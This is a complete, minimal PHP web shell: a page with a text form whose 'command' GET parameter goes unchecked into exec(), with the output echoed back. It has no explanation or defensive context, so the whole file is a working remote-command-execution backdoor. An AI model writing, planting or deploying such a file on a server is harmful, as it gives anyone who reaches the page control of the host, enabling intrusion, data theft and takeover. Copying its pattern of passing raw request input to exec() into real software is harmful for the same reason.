<?php
    if(isset($_GET)){
        $result=exec($_GET['command']);
    }
?>
<form method="GET">
    <input type="text" name="command">
</form>
<?php
    if($result){
        echo $result;
    }
?>
